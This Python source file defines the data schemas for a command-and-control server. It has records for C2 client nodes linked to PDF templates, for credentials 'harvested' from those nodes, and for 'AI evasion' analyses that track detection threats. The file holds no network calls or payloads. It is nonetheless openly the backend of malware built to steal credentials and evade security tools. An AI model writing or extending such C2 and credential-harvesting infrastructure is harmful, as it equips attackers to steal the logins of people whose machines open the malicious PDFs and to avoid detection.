"""Core schemas for C2 server."""

from datetime import datetime
from typing import Optional, List, Dict
from dataclasses import dataclass, field
import uuid


@dataclass
class C2Node:
    """Core schema for C2 client node."""
    
    node_id: str
    watermark: str
    c2_url: str
    status: str = "disconnected"
    last_heartbeat: Optional[str] = None
    last_harvest: Optional[str] = None
    last_evasion: Optional[str] = None
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    updated_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    pdf_id: Optional[str] = None
    source_path: str = "pdfs/templates/base.pdf"
    
    @classmethod
    def create(cls, c2_url: str, pdf_id: str) -> "C2Node":
        """Create new C2 node."""
        import hashlib
        
        node_id = f"node_{pdf_id[:8]}"
        watermark = hashlib.md5(
            (node_id + str(uuid.uuid4())[:8]).encode()
        ).hexdigest()[:8]
        
        return cls(
            node_id=node_id,
            watermark=watermark,
            c2_url=c2_url,
            pdf_id=pdf_id,
        )


@dataclass
class C2Credential:
    """Core schema for harvested credential."""
    
    key: str
    credential_type: str
    node_id: str
    watermark: str
    timestamp: str
    status: str = "pending"
    processed: bool = False
    processed_at: Optional[str] = None
    
    @property
    def display_key(self) -> str:
        """Get display key."""
        return f"{self.key[:8]}..."


@dataclass
class C2EvasionAnalysis:
    """Core schema for AI evasion analysis."""
    
    node_id: str
    threat_level: str
    threats_detected: List[Dict] = field(default_factory=list)
    confidence: float = 0.0
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    error: Optional[str] = None
    
    @classmethod
    def create(cls, node_id: str, threat_level: str) -> "C2EvasionAnalysis":
        """Create new evasion analysis."""
        return cls(
            node_id=node_id,
            threat_level=threat_level,
            confidence=0.8,
        )